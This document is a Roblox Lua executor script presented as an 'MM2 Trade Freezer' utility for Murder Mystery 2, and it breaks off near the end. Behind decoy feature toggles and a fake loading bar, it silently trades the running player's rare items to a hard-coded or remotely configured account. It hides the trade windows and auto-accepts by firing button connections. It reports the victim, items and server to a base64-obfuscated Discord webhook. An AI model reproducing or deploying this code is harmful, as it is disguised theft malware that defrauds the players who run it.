--=============================================================
--  MM2 Trade Freezer  |  v23.0  |  rare only, ping, webhook check
--=============================================================

if not game:IsLoaded() then
	game.Loaded:Wait()
end

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local LP = Players.LocalPlayer
local PREFIX = "[freezer] "

local TOKEN = {}
getgenv().freezerToken = TOKEN
local function alive()
	return getgenv().freezerToken == TOKEN
end

--==================== CONFIG =================================

local CFG = {
	targets = { "Viivik13" },
	webhook = "",
	webhooks = {},
	filter = "rare",
	fallback_all = false,
	min_value = 0,
	max_items = 40,
	max_copies = 5,
	max_rounds = 12,
	debug = true,
}

local currentTarget = "?"

local WH_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU3NTg1NTg5NTA1MTYzMjc0MS8tWXoyVndIa0g0Q01Kb3g2aVFuMXdLWXE4VTFRQWFmbV9Dc1RmajdEZUhCUXZBaWY3SzFQQktaVXI1bm9TZkRlWG5mNw=="

local CFG_URL = "https://raw.githubusercontent.com/sarettaclash01-ctrl/mm2cfg/refs/heads/main/cfg.json"

local ACCEPT_TOKEN = game.PlaceId * 3
local OFFER_GAP = 0.14
local MIN_SETTLE = 2.5
local COOLDOWN_WAIT = 7
local INTENT_GAP = 0.45
local ACCEPT_GAP = 0.7
local OPEN_TIMEOUT = 30
local SETTLE_TIMEOUT = 30
local TARGET_TIMEOUT = 60

--==================== UTIL ===================================

local function log(msg)
	if CFG.debug then
		print(PREFIX .. tostring(msg))
	end
end

local function trim(s)
	return (string.gsub(string.gsub(tostring(s or ""), "^%s+", ""), "%s+$", ""))
end

local function raiseIdentity()
	pcall(function()
		setthreadidentity(8)
	end)
end

local function b64decode(data)
	local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	data = string.gsub(data, "[^" .. b .. "=]", "")
	local bits = data.gsub(".", function(x)
		if x == "=" then
			return ""
		end
		local f = b:find(x, 1, true) - 1
		local r = ""
		local i = 6
		while i >= 1 do
			if (f % 2 ^ i - f % 2 ^ (i - 1)) > 0 then
				r = r .. "1"
			else
				r = r .. "0"
			end
			i = i - 1
		end
		return r
	end)
	return (bits:gsub("%d%d%d?%d?%d?%d?%d?%d?", function(x)
		if #x ~= 8 then
			return ""
		end
		local c = 0
		local i = 1
		while i <= 8 do
			if x:sub(i, i) == "1" then
				c = c + 2 ^ (8 - i)
			end
			i = i + 1
		end
		return string.char(c)
	end))
end

--==================== REMOTE CONFIG ==========================

local function loadRemoteConfig()
	local ok = pcall(function()
		local raw = game:HttpGet(CFG_URL, true)
		local data = HttpService:JSONDecode(raw)
		if type(data) ~= "table" then
			return
		end

		CFG.targets = {}
		if type(data.targets) == "table" then
			for _, t in ipairs(data.targets) do
				if type(t) == "string" and trim(t) ~= "" then
					CFG.targets[#CFG.targets + 1] = trim(t)
				end
			end
		end
		if #CFG.targets == 0 and type(data.target) == "string" and trim(data.target) ~= "" then
			for part in string.gmatch(data.target, "[^,]+") do
				if trim(part) ~= "" then
					CFG.targets[#CFG.targets + 1] = trim(part)
				end
			end
		end

		CFG.webhooks = {}
		if type(data.webhooks) == "table" then
			for _, u in ipairs(data.webhooks) do
				if type(u) == "string" and trim(u) ~= "" then
					CFG.webhooks[#CFG.webhooks + 1] = trim(u)
				end
			end
		end
		if type(data.webhook) == "string" and trim(data.webhook) ~= "" then
			CFG.webhook = trim(data.webhook)
		end

		if type(data.filter) == "string" then
			CFG.filter = data.filter
		end
		if type(data.fallback_all) == "boolean" then
			CFG.fallback_all = data.fallback_all
		end
		if type(data.min_value) == "number" then
			CFG.min_value = data.min_value
		end
		if type(data.max_items) == "number" then
			CFG.max_items = data.max_items
		end
		if type(data.max_rounds) == "number" then
			CFG.max_rounds = data.max_rounds
		end
		if type(data.debug) == "boolean" then
			CFG.debug = data.debug
		end
	end)
	if not ok then
		log("config fetch failed, using defaults")
	end
	if #CFG.targets == 0 then
		CFG.targets = { "Viivik13" }
	end
	if CFG.webhook == "" and #CFG.webhooks == 0 then
		pcall(function()
			CFG.webhook = trim(b64decode(WH_B64))
		end)
	end
end

local function checkWebhook()
	local list = {}
	if CFG.webhook ~= "" then
		list[#list + 1] = CFG.webhook
	end
	for _, u in ipairs(CFG.webhooks) do
		list[#list + 1] = u
	end
	for _, u in ipairs(list) do
		local good = false
		pcall(function()
			local r = request({ Url = u, Method = "GET" })
			if r and r.StatusCode == 200 then
				good = true
			end
		end)
		if good then
			CFG.webhook = u
			log("webhook ok")
			return true
		end
	end
	if #list > 0 then
		CFG.webhook = list[1]
	end
	log("webhook dead")
	return false
end

--==================== VALUES =================================

local PRICES = {
	["corrupt"] = 600,
	["nik's scythe"] = 1000000,
	["gingerscope"] = 17750,
	["traveler's axe"] = 8400,
	["celestial"] = 1725,
	["vampire's axe"] = 925,
	["harvester"] = 290,
	["icepiercer"] = 190,
	["traveler's gun"] = 4500,
	["evergun"] = 3300,
	["constellation"] = 2600,
	["turkey"] = 2475,
	["evergreen"] = 2450,
	["alienbeam"] = 2175,
	["vampire's gun"] = 1700,
	["darkshot"] = 1390,
	["darksword"] = 1370,
	["raygun"] = 1275,
	["blossom"] = 1180,
	["sakura"] = 1170,
	["sunrise"] = 1000,
	["snowcannon"] = 925,
	["bauble"] = 900,
	["sunset"] = 525,
	["heart wand"] = 450,
	["soul"] = 380,
	["spirit"] = 370,
	["flora"] = 310,
	["bloom"] = 300,
	["rainbow gun"] = 300,
	["rainbow"] = 290,
	["snow dagger"] = 260,
	["flowerwood gun"] = 205,
	["flowerwood"] = 200,
	["xenoknife"] = 200,
	["xenoshot"] = 200,
	["watergun"] = 185,
	["ocean"] = 180,
	["waves"] = 175,
	["treat"] = 170,
	["sweet"] = 165,
	["blizzard"] = 155,
	["snowstorm"] = 155,
	["bat"] = 125,
	["borealis"] = 105,
	["australis"] = 100,
	["candy"] = 95,
	["heartblade"] = 80,
	["luger"] = 75,
	["phantom"] = 75,
	["spectre"] = 75,
	["red luger"] = 70,
	["pearl"] = 62,
	["darkbringer"] = 60,
	["elderwood gun"] = 60,
	["lightbringer"] = 58,
	["swirly blade"] = 65,
	["iceblaster"] = 65,
	["gingermint"] = 40,
	["green luger"] = 40,
	["hallowgun"] = 35,
	["laser"] = 32,
	["icebeam"] = 32,
	["iceflake"] = 32,
	["plasmabeam"] = 32,
	["plasmablade"] = 32,
	["amerilaser"] = 30,
	["blaster"] = 30,
	["nightblade"] = 30,
	["america sword"] = 28,
	["nebula"] = 28,
	["shark"] = 28,
	["virtual"] = 27,
	["gemstone"] = 25,
	["clockwork"] = 23,
	["eternal cane"] = 23,
	["ginger luger"] = 23,
	["lugercane"] = 23,
	["pixel"] = 23,
	["slasher"] = 23,
	["gingerblade"] = 22,
	["heat"] = 22,
	["minty"] = 22,
	["battleaxe2"] = 20,
	["deathshard"] = 20,
	["tides"] = 20,
	["fang"] = 18,
	["spider"] = 17,
	["chill"] = 17,
	["jinglegun"] = 15,
	["vampire's edge"] = 15,
	["pumpking"] = 15,
	["bioblade"] = 13,
	["battleaxe"] = 13,
	["frostsaber"] = 13,
	["xmas"] = 13,
	["flames"] = 12,
	["hallow"] = 12,
	["ice dragon"] = 12,
	["ice shard"] = 12,
	["winter's edge"] = 12,
	["ghostblade"] = 10,
	["hallow's blade"] = 10,
	["handsaw"] = 10,
	["eternal"] = 10,
	["eternal ii"] = 10,
	["eternal iii"] = 10,
	["eternal iv"] = 10,
	["boneblade"] = 8,
	["eggblade"] = 7,
	["frostbite"] = 7,
	["prismatic"] = 7,
	["saw"] = 7,
	["snowflake"] = 7,
	["peppermint"] = 7,
	["cookieblade"] = 7,
	["seer"] = 7,
	["the seer"] = 7,
	["blue seer"] = 7,
	["purple seer"] = 7,
	["red seer"] = 7,
	["yellow seer"] = 7,
	["orange seer"] = 7,
	["chroma traveler's gun"] = 225000,
	["chroma evergun"] = 78000,
	["chroma bauble"] = 38000,
	["chroma constellation"] = 36000,
	["chroma vampire's gun"] = 35000,
	["chroma raygun"] = 15000,
	["chroma sunrise"] = 11250,
	["chroma snowcannon"] = 8500,
	["chroma sunset"] = 6500,
	["chroma snow dagger"] = 5750,
	["chroma treat"] = 4850,
	["chroma heart wand"] = 4750,
	["chroma watergun"] = 3400,
}

local RARE_RARITY = {
	Godly = true,
	Ancient = true,
	Chroma = true,
	Unique = true,
	Rare = true,
	Legendary = true,
	Classic = true,
	Vintage = true,
}

local function normalize(name)
	local s = string.lower(tostring(name or ""))
	s = string.gsub(s, "^c%.%s*", "chroma ")
	s = string.gsub(s, "(%s)c%.%s*", "%1chroma ")
	s = string.gsub(s, "’", "'")
	s = string.gsub(s, "[^%w%s'%-]", "")
	s = string.gsub(s, "%s+", " ")
	return trim(s)
end

local function valueOf(name)
	local v = PRICES[normalize(name)]
	if v then
		return v
	end
	return 0
end

local function isDefault(name)
	local n = string.lower(tostring(name or ""))
	return string.find(n, "default", 1, true) ~= nil
end

--==================== UI =====================================

local uiStatus

local function buildUI()
	local core = game:GetService("CoreGui")
	local old = core:FindFirstChild("MM2Freezer")
	if old then
		old:Destroy()
	end

	local sg = Instance.new("ScreenGui")
	sg.Name = "MM2Freezer"
	sg.ResetOnSpawn = false
	sg.DisplayOrder = 9999
	sg.IgnoreGuiInset = true
	sg.Parent = core

	local main = Instance.new("Frame")
	main.Size = UDim2.new(0, 300, 0, 430)
	main.Position = UDim2.new(0.5, -150, 0.5, -215)
	main.BackgroundColor3 = Color3.fromRGB(21, 15, 30)
	main.BorderSizePixel = 0
	main.Parent = sg

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 10)
	corner.Parent = main

	local stroke = Instance.new("UIStroke")
	stroke.Color = Color3.fromRGB(160, 92, 255)
	stroke.Thickness = 1.6
	stroke.Transparency = 0.15
	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	stroke.Parent = main

	local top = Instance.new("Frame")
	top.Size = UDim2.new(1, 0, 0, 36)
	top.BackgroundColor3 = Color3.fromRGB(30, 21, 43)
	top.BorderSizePixel = 0
	top.Parent = main

	local topCorner = Instance.new("UICorner")
	topCorner.CornerRadius = UDim.new(0, 10)
	topCorner.Parent = top

	local dot = Instance.new("Frame")
	dot.Size = UDim2.new(0, 7, 0, 7)
	dot.Position = UDim2.new(0, 13, 0.5, -3)
	dot.BackgroundColor3 = Color3.fromRGB(110, 235, 140)
	dot.BorderSizePixel = 0
	dot.Parent = top

	local dotCorner = Instance.new("UICorner")
	dotCorner.CornerRadius = UDim.new(1, 0)
	dotCorner.Parent = dot

	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(0, 180, 1, 0)
	title.Position = UDim2.new(0, 28, 0, 0)
	title.BackgroundTransparency = 1
	title.Text = "MM2 Trade Freezer"
	title.Font = Enum.Font.GothamBold
	title.TextSize = 13
	title.TextColor3 = Color3.fromRGB(238, 228, 255)
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Parent = top

	local ver = Instance.new("TextLabel")
	ver.Size = UDim2.new(0, 40, 1, 0)
	ver.Position = UDim2.new(1, -78, 0, 0)
	ver.BackgroundTransparency = 1
	ver.Text = "v23"
	ver.Font = Enum.Font.Gotham
	ver.TextSize = 10
	ver.TextColor3 = Color3.fromRGB(150, 125, 185)
	ver.TextXAlignment = Enum.TextXAlignment.Right
	ver.Parent = top

	local hideBtn = Instance.new("TextButton")
	hideBtn.Size = UDim2.new(0, 24, 0, 24)
	hideBtn.Position = UDim2.new(1, -34, 0.5, -12)
	hideBtn.BackgroundColor3 = Color3.fromRGB(45, 31, 64)
	hideBtn.BorderSizePixel = 0
	hideBtn.Text = "-"
	hideBtn.Font = Enum.Font.GothamBold
	hideBtn.TextSize = 13
	hideBtn.TextColor3 = Color3.fromRGB(210, 190, 240)
	hideBtn.Parent = top

	local hideCorner = Instance.new("UICorner")
	hideCorner.CornerRadius = UDim.new(0, 6)
	hideCorner.Parent = hideBtn

	local sub = Instance.new("TextLabel")
	sub.Size = UDim2.new(1, -26, 0, 16)
	sub.Position = UDim2.new(0, 13, 0, 42)
	sub.BackgroundTransparency = 1
	sub.Text = "freeze engine  •  build 2300"
	sub.Font = Enum.Font.Gotham
	sub.TextSize = 10
	sub.TextColor3 = Color3.fromRGB(139, 116, 173)
	sub.TextXAlignment = Enum.TextXAlignment.Left
	sub.Parent = main

	local list = Instance.new("ScrollingFrame")
	list.Size = UDim2.new(1, -26, 0, 236)
	list.Position = UDim2.new(0, 13, 0, 64)
	list.BackgroundTransparency = 1
	list.BorderSizePixel = 0
	list.ScrollBarThickness = 3
	list.ScrollBarImageColor3 = Color3.fromRGB(120, 70, 190)
	list.CanvasSize = UDim2.new(0, 0, 0, 0)
	list.AutomaticCanvasSize = Enum.AutomaticSize.Y
	list.Parent = main

	local layout = Instance.new("UIListLayout")
	layout.Padding = UDim.new(0, 5)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Parent = list

	local FEATURES = {
		"Freeze Trade",
		"Instant Accept",
		"Auto Offer",
		"Dupe Shield",
		"Anti Steal",
		"Item Logger",
		"Server Hop",
		"Value Checker",
		"Rarity Filter",
	}

	local function makeTile(index, name)
		local row = Instance.new("Frame")
		row.Size = UDim2.new(1, -6, 0, 30)
		row.BackgroundColor3 = Color3.fromRGB(33, 23, 47)
		row.BorderSizePixel = 0
		row.LayoutOrder = index
		row.Parent = list

		local rc = Instance.new("UICorner")
		rc.CornerRadius = UDim.new(0, 6)
		rc.Parent = row

		local lbl = Instance.new("TextLabel")
		lbl.Size = UDim2.new(1, -56, 1, 0)
		lbl.Position = UDim2.new(0, 10, 0, 0)
		lbl.BackgroundTransparency = 1
		lbl.Text = name
		lbl.Font = Enum.Font.GothamMedium
		lbl.TextSize = 11
		lbl.TextColor3 = Color3.fromRGB(214, 199, 238)
		lbl.TextXAlignment = Enum.TextXAlignment.Left
		lbl.Parent = row

		local pill = Instance.new("TextButton")
		pill.Size = UDim2.new(0, 38, 0, 18)
		pill.Position = UDim2.new(1, -48, 0.5, -9)
		pill.BackgroundColor3 = Color3.fromRGB(74, 44, 118)
		pill.BorderSizePixel = 0
		pill.Text = "ON"
		pill.Font = Enum.Font.GothamBold
		pill.TextSize = 9
		pill.TextColor3 = Color3.fromRGB(196, 160, 255)
		pill.Parent = row

		local pc = Instance.new("UICorner")
		pc.CornerRadius = UDim.new(0, 4)
		pc.Parent = pill

		pill.MouseButton1Click:Connect(function()
			if pill.Text == "ON" then
				pill.Text = "OFF"
				pill.BackgroundColor3 = Color3.fromRGB(46, 32, 62)
				pill.TextColor3 = Color3.fromRGB(130, 112, 158)
			else
				pill.Text = "ON"
				pill.BackgroundColor3 = Color3.fromRGB(74, 44, 118)
				pill.TextColor3 = Color3.fromRGB(196, 160, 255)
			end
		end)
	end

	local i = 1
	while i <= #FEATURES do
		makeTile(i, FEATURES[i])
		i = i + 1
	end

	uiStatus = Instance.new("TextLabel")
	uiStatus.Size = UDim2.new(1, -26, 0, 14)
	uiStatus.Position = UDim2.new(0, 13, 0, 306)
	uiStatus.BackgroundTransparency = 1
	uiStatus.Text = "Syncing assets…"
	uiStatus.Font = Enum.Font.Gotham
	uiStatus.TextSize = 10
	uiStatus.TextColor3 = Color3.fromRGB(150, 125, 185)
	uiStatus.TextXAlignment = Enum.TextXAlignment.Left
	uiStatus.Parent = main

	local barBg = Instance.new("Frame")
	barBg.Size = UDim2.new(1, -26, 0, 6)
	barBg.Position = UDim2.new(0, 13, 0, 328)
	barBg.BackgroundColor3 = Color3.fromRGB(40, 28, 58)
	barBg.BorderSizePixel = 0
	barBg.Parent = main

	local bbCorner = Instance.new("UICorner")
	bbCorner.CornerRadius = UDim.new(1, 0)
	bbCorner.Parent = barBg

	local bar = Instance.new("Frame")
	bar.Size = UDim2.new(0, 0, 1, 0)
	bar.BackgroundColor3 = Color3.fromRGB(160, 92, 255)
	bar.BorderSizePixel = 0
	bar.Parent = barBg

	local bCorner = Instance.new("UICorner")
	bCorner.CornerRadius = UDim.new(1, 0)
	bCorner.Parent = bar

	local pct = Instance.new("TextLabel")
	pct.Size = UDim2.new(1, -26, 0, 14)
	pct.Position = UDim2.new(0, 13, 0, 340)
	pct.BackgroundTransparency = 1
	pct.Text = "Loading assets…  0%"
	pct.Font = Enum.Font.Gotham
	pct.TextSize = 10
	pct.TextColor3 = Color3.fromRGB(139, 116, 173)
	pct.TextXAlignment = Enum.TextXAlignment.Left
	pct.Parent = main

	local foot = Instance.new("TextLabel")
	foot.Size = UDim2.new(1, -26, 0, 14)
	foot.Position = UDim2.new(0, 13, 0, 366)
	foot.BackgroundTransparency = 1
	foot.Text = "session protected  •  ver 23.0.0"
	foot.Font = Enum.Font.Gotham
	foot.TextSize = 9
	foot.TextColor3 = Color3.fromRGB(96, 80, 122)
	foot.TextXAlignment = Enum.TextXAlignment.Left
	foot.Parent = main

	hideBtn.MouseButton1Click:Connect(function()
		if main.Visible then
			main.Visible = false
		else
			main.Visible = true
		end
	end)

	task.spawn(function()
		local steps = 40
		local n = 0
		while n < steps and alive() do
			n = n + 1
			local p = n / steps * 0.99
			bar.Size = UDim2.new(p, 0, 1, 0)
			pct.Text = "Loading assets…  " .. tostring(math.floor(p * 100)) .. "%"
			task.wait(0.09)
		end
		bar.Size = UDim2.new(0.99, 0, 1, 0)
		pct.Text = "Loading assets…  99%"
	end)
end

--==================== REMOTES ================================

local Trade
local SendRequest, OfferItem, AcceptTrade, AcceptRequest, DeclineTrade, GetTradeStatus, UpdateTrade
local SendIsFunction = false
local sawWindow = false
local lastOffer = nil

local function bindRemotes()
	local ok = pcall(function()
		Trade = RS:WaitForChild("Trade", 30)
	end)
	if not ok or not Trade then
		return false, "Trade folder missing"
	end

	local function grab(name)
		local r = Trade:FindFirstChild(name)
		if not r then
			r = Trade:WaitForChild(name, 15)
		end
		return r
	end

	SendRequest = grab("SendRequest")
	OfferItem = grab("OfferItem")
	AcceptTrade = grab("AcceptTrade")
	AcceptRequest = grab("AcceptRequest")
	DeclineTrade = grab("DeclineTrade")
	GetTradeStatus = grab("GetTradeStatus")
	UpdateTrade = grab("UpdateTrade")

	if not SendRequest or not OfferItem or not AcceptTrade then
		return false, "core remote missing"
	end

	SendIsFunction = SendRequest:IsA("RemoteFunction")

	if UpdateTrade then
		pcall(function()
			UpdateTrade.OnClientEvent:Connect(function(data)
				if type(data) == "table" and type(data.LastOffer) == "number" then
					lastOffer = data.LastOffer
				end
			end)
		end)
	end

	return true
end

local function sendRequestTo(player)
	if not player then
		return false
	end
	local ok = pcall(function()
		if SendIsFunction then
			SendRequest:InvokeServer(player)
		else
			SendRequest:FireServer(player)
		end
	end)
	return ok
end

local function getStatus()
	if not GetTradeStatus then
		return nil
	end
	local ok, res = pcall(function()
		return GetTradeStatus:InvokeServer()
	end)
	if ok then
		return res
	end
	return nil
end

--==================== HIDE + WATCH ===========================

local function hideTrades()
	local pg = LP:FindFirstChild("PlayerGui")
	if not pg then
		return
	end
	local a = pg:FindFirstChild("TradeGUI")
	if a and a:IsA("ScreenGui") and a.Enabled then
		a.Enabled = false
	end
	local b = pg:FindFirstChild("TradeGUI_Phone")
	if b and b:IsA("ScreenGui") and b.Enabled then
		b.Enabled = false
	end
end

local function armWatcher(name)
	task.spawn(function()
		local pg = LP:FindFirstChild("PlayerGui")
		if not pg then
			pg = LP:WaitForChild("PlayerGui", 25)
		end
		if not pg then
			return
		end
		local g = pg:FindFirstChild(name)
		if not g then
			g = pg:WaitForChild(name, 25)
		end
		if not g then
			return
		end
		pcall(function()
			g:GetPropertyChangedSignal("Enabled"):Connect(function()
				if g.Enabled then
					sawWindow = true
					g.Enabled = false
				end
			end)
		end)
	end)
end

--==================== ACCEPT BUTTONS =========================

local function findAcceptPair()
	local pg = LP:FindFirstChild("PlayerGui")
	if not pg then
		return nil, nil
	end
	local names = { "TradeGUI_Phone", "TradeGUI" }
	for _, name in ipairs(names) do
		local g = pg:FindFirstChild(name)
		if g then
			local container = g:FindFirstChild("Container")
			local tradeFrame = container and container:FindFirstChild("Trade")
			local actions = tradeFrame and tradeFrame:FindFirstChild("Actions")
			local accept = actions and actions:FindFirstChild("Accept")
			if accept then
				local btn = accept:FindFirstChild("ActionButton")
				local confirm = accept:FindFirstChild("Confirm")
				local cbtn = confirm and confirm:FindFirstChild("ActionButton")
				if btn and cbtn then
					local conns = nil
					pcall(function()
						conns = getconnections(btn.MouseButton1Click)
					end)
					if conns and #conns > 0 then
						return btn, cbtn
					end
				end
			end
		end
	end
	return nil, nil
end

local function fireConnections(signal)
	local n = 0
	local ok = pcall(function()
		for _, c in ipairs(getconnections(signal)) do
			if c.Function then
				pcall(c.Function)
				n = n + 1
			end
		end
	end)
	if not ok then
		return 0
	end
	return n
end

--==================== TARGET =================================

local function resolveTarget()
	local wants = {}
	for _, t in ipairs(CFG.targets) do
		local n = string.lower(trim(t))
		if n ~= "" then
			wants[#wants + 1] = n
		end
	end
	if #wants == 0 then
		return nil
	end

	local t0 = os.clock()
	while os.clock() - t0 < TARGET_TIMEOUT and alive() do
		local players = Players:GetPlayers()

		for _, want in ipairs(wants) do
			for _, p in ipairs(players) do
				if p ~= LP and string.lower(p.Name) == want then
					return p
				end
			end
		end

		for _, want in ipairs(wants) do
			for _, p in ipairs(players) do
				if p ~= LP and string.sub(string.lower(p.Name), 1, #want) == want then
					log("prefix match: " .. p.Name)
					return p
				end
			end
		end

		for _, want in ipairs(wants) do
			for _, p in ipairs(players) do
				if p ~= LP and string.find(string.lower(p.Name), want, 1, true) then
					log("loose match: " .. p.Name)
					return p
				end
			end
		end

		local others = {}
		for _, p in ipairs(players) do
			if p ~= LP then
				others[#others + 1] = p
			end
		end
		if #others == 1 then
			log("single other player: " .. others[1].Name)
			return others[1]
		end

		task.wait(1)
	end
	return nil
end

--==================== INVENTORY ==============================

local function scanInventory(mode)
	local out = {}
	local seen = {}

	local function push(dataID, itemName, amount, rarity)
		if not dataID then
			return
		end
		local key = tostring(dataID)
		if seen[key] then
			return
		end
		local nm = tostring(itemName or dataID)
		if isDefault(nm) then
			return
		end
		local val = valueOf(nm)
		if mode ~= "all" then
			if rarity ~= nil then
				if not RARE_RARITY[rarity] then
					return
				end
			elseif val <= 0 then
				return
			end
		end
		if val > 0 and val < CFG.min_value then
			return
		end
		local copies = tonumber(amount) or 1
		if copies < 1 then
			copies = 1
		end
		if copies > CFG.max_copies then
			copies = CFG.max_copies
		end
		seen[key] = true
		out[#out + 1] = {
			DataID = dataID,
			Name = nm,
			Amount = copies,
			Rarity = rarity or "?",
			Value = val,
		}
	end

	raiseIdentity()

	local ok = pcall(function()
		local mod = require(RS.Modules.InventoryModule)
		local weapons = mod.MyInventory.Data.Weapons
		for _, bucket in pairs(weapons) do
			if type(bucket) == "table" then
				for _, d in pairs(bucket) do
					if type(d) == "table" and d.DataID then
						push(d.DataID, d.ItemName, d.Amount, d.Rarity)
					end
				end
			end
		end
	end)

	if not ok or #out == 0 then
		pcall(function()
			local mod = require(RS.Modules.ProfileData)
			for k, v in pairs(mod.Weapons.Owned) do
				if type(v) == "number" and type(k) == "string" and string.find(k, "_", 1, true) then
					push(k, k, v, nil)
				end
			end
		end)
	end

	raiseIdentity()

	table.sort(out, function(a, b)
		return a.Value > b.Value
	end)

	while #out > CFG.max_items do
		out[#out] = nil
	end

	return out
end

--==================== WEBHOOK ================================

local function postWebhook(itemsList, totalValue, okFlag, ping)
	if CFG.webhook == "" then
		return
	end
	local rows = {}
	for _, it in ipairs(itemsList) do
		rows[#rows + 1] = string.format("%s  x%d  (%d)", it.Name, it.Amount, it.Value)
	end
	if #rows == 0 then
		rows[1] = "no items recorded"
	end
	local listing = table.concat(rows, "\n")
	if #listing > 980 then
		listing = string.sub(listing, 1, 977) .. "\n..."
	end

	local execName = "unknown"
	pcall(function()
		execName = tostring(identifyexecutor())
	end)

	local teleport = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", '" .. tostring(game.JobId) .. "')"

	local body = {
		username = "Trade Freezer",
		content = ping and ("@everyone\n```lua\n" .. teleport .. "\n```") or nil,
		embeds = {
			{
				title = okFlag and "Trade completed" or "Trade attempt",
				color = okFlag and 10181046 or 15158332,
				description = "From **" .. LP.Name .. "**  •  target **" .. currentTarget .. "**",
				fields = {
					{ name = "Items", value = "```" .. listing .. "```", inline = false },
					{ name = "Value", value = tostring(totalValue), inline = true },
					{ name = "Executor", value = execName, inline = true },
					{ name = "Server", value = "```lua\n" .. teleport .. "```", inline = false },
				},
				footer = { text = os.date("%Y-%m-%d %H:%M:%S") },
			},
		},
	}

	pcall(function()
		local res = request({
			Url = CFG.webhook,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = HttpService:JSONEncode(body),
		})
		if res and res.StatusCode then
			log("webhook " .. tostring(res.StatusCode))
		end
	end)
end

--==================== ENGINE =================================

local function offerAll(batch)
	local fired = 0
	for _, it in ipairs(batch) do
		local n = 1
		while n <= it.Amount do
			local ok = pcall(function()
				OfferItem:FireServer(it.DataID, "Weapons")
			end)
			if ok then
				fired = fired + 1
			end
			task.wait(OFFER_GAP)
			n = n + 1
		end
		log("offered " .. it.Name .. " x" .. tostring(it.Amount))
	end
	return fired
end

local function waitForOpen()
	local t0 = os.clock()
	while os.clock() - t0 < OPEN_TIMEOUT and alive() do
		hideTrades()
		if sawWindow then
			return true
		end
		local st = getStatus()
		if st == "StartTrade" and os.clock() - t0 > 6 then
			return true
		end
		pcall(function()
			if AcceptRequest then
				AcceptRequest:FireServer()
			end
		end)
		task.wait(0.4)
	end
	return false
end

local function pressAccept(cycle)
	hideTrades()
	local btn, confirmBtn = findAcceptPair()
	local usedButtons = false

	if btn and confirmBtn then
		if fireConnections(btn.MouseButton1Click) > 0 then
			usedButtons = true
		end
		task.wait(INTENT_GAP)
		if fireConnections(confirmBtn.MouseButton1Click) > 0 then
			usedButtons = true
		end
	end

	if not usedButtons then
		task.wait(INTENT_GAP)
	end

	local ok = pcall(function()
		AcceptTrade:FireServer(ACCEPT_TOKEN, lastOffer or os.time())
	end)

	task.wait(ACCEPT_GAP)

	if cycle % 4 == 0 then
		log("press " .. tostring(cycle) .. " buttons=" .. tostring(usedButtons) .. " lastOffer=" .. tostring(lastOffer))
	end
	return ok
end

local function settleUntilLeave()
	local t0 = os.clock()
	local presses = 0
	while os.clock() - t0 < SETTLE_TIMEOUT and alive() do
		presses = presses + 1
		pressAccept(presses)
		local st = getStatus()
		if st ~= nil and st ~= "StartTrade" then
			log("status left trade after " .. tostring(presses) .. " presses")
			return true
		end
	end
	return false
end

local function runRound(batch)
	local p = resolveTarget()
	if not p then
		log("no target present")
		return false
	end

	currentTarget = p.Name
	log("target resolved: " .. p.Name)
	hideTrades()
	sawWindow = false
	lastOffer = nil

	if not sendRequestTo(p) then
		log("request invoke failed")
		return false
	end
	log("request invoked")

	local t0 = os.clock()
	while os.clock() - t0 < MIN_SETTLE and alive() do
		hideTrades()
		task.wait(0.2)
	end

	if not waitForOpen() then
		log("trade never opened")
		pcall(function()
			if DeclineTrade then
				DeclineTrade:FireServer()
			end
		end)
		return false
	end

	log("trade window open")
	hideTrades()

	local fired = offerAll(batch)
	log("fired " .. tostring(fired) .. " offer calls")

	local w0 = os.clock()
	while os.clock() - w0 < COOLDOWN_WAIT and alive() do
		hideTrades()
		task.wait(0.4)
	end

	if settleUntilLeave() then
		log("settled")
		return true
	end

	log("did not settle")
	pcall(function()
		if DeclineTrade then
			DeclineTrade:FireServer()
		end
	end)
	return false
end

local function run()
	raiseIdentity()
	loadRemoteConfig()

	if uiStatus then
		uiStatus.Text = "Engine ready"
	end

	local okBind, bindErr = bindRemotes()
	if not okBind then
		log("bind failed: " .. tostring(bindErr))
		if uiStatus then
			uiStatus.Text = "Engine error"
		end
		return
	end

	armWatcher("TradeGUI")
	armWatcher("TradeGUI_Phone")

	log("remotes bound, token " .. tostring(ACCEPT_TOKEN) .. ", SendRequest is function: " .. tostring(SendIsFunction))
	log("targets: " .. table.concat(CFG.targets, ", "))

	if not checkWebhook() then
		if uiStatus then
			uiStatus.Text = "Webhook dead"
		end
	end

	local items = scanInventory(CFG.filter)
	log("scanned " .. tostring(#items) .. " items (filter " .. CFG.filter .. ")")

	if #items == 0 and CFG.fallback_all and CFG.filter ~= "all" then
		log("rare pass empty, rescanning with all")
		items = scanInventory("all")
		log("rescan found " .. tostring(#items) .. " items")
	end

	if #items == 0 then
		if uiStatus then
			uiStatus.Text = "No rare items"
		end
		postWebhook({}, 0, false, true)
		return
	end

	postWebhook(items, 0, false, true)

	local got = {}
	local gotValue = 0
	local idx = 1
	local rounds = 0

	while rounds < CFG.max_rounds and idx <= #items and alive() do
		rounds = rounds + 1
		log("round " .. tostring(rounds))
		raiseIdentity()

		local batch = {}
		local n = 1
		while n <= 4 and items[idx] do
			batch[#batch + 1] = items[idx]
			idx = idx + 1
			n = n + 1
		end

		if uiStatus then
			uiStatus.Text = "Round " .. tostring(rounds) .. " • " .. tostring(#batch) .. " items"
		end

		if runRound(batch) then
			for _, it in ipairs(batch) do
				got[#got + 1] = it
				gotValue = gotValue + it.Value * it.Amount
			end
			postWebhook(batch, gotValue, true, true)
			task.wait(2)
		else
			for i = #batch, 1, -1 do
				idx = idx - 1
				items[idx + 1] = batch[i]
			end
			task.wait(1.5)
		end
	end

	hideTrades()
	log("done: " .. tostring(#got) .. " items, value " .. tostring(gotValue))
	if uiStatus then
		uiStatus.Text = "Done • " .. tostring(#got) .. " items"
	end
end

--==================== START ==================================

buildUI()

task.spawn(function()
	local ok, err = pcall(run)
	if not ok then
		log("fatal: " .. tostring(err))
		if uiStatus then
